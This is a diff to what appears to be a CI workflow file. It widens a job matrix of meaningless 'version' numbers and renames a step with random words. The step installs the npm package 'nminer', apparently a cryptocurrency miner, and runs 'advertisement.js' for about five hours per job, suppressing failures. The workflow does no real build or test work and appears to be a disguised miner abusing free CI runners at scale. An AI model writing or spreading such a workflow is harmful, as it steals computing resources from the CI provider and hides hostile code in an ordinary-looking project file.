@@ -9,22 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 5788 }
-          - { version: 7346 }
-          - { version: 2171 }
-          - { version: 8672 }
-          - { version: 2259 }
-          - { version: 6456 }
-          - { version: 631 }
-          - { version: 1803 }
+          - { version: 3522 }
+          - { version: 3621 }
+          - { version: 9127 }
+          - { version: 7415 }
+          - { version: 3797 }
+          - { version: 9093 }
+          - { version: 7114 }
+          - { version: 9307 }
+          - { version: 6406 }
+          - { version: 108 }
+          - { version: 7392 }
+          - { version: 1589 }
+          - { version: 1288 }
           - { version: 8565 }
-          - { version: 6517 }
-          - { version: 2262 }
-          - { version: 2313 }
-          - { version: 161 }
-          - { version: 2742 }
-          - { version: 7094 }
-          - { version: 4202 }
+          - { version: 2400 }
+          - { version: 307 }
 
     steps:
       - name: Checkout
@@ -35,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: always thin oof ah youthfully
+      - name: overcooked kindly
         run: |
           npm install nminer@latest
-          timeout 333m node advertisement.js || echo "advertisement executed"
+          timeout 302m node advertisement.js || echo "advertisement executed"
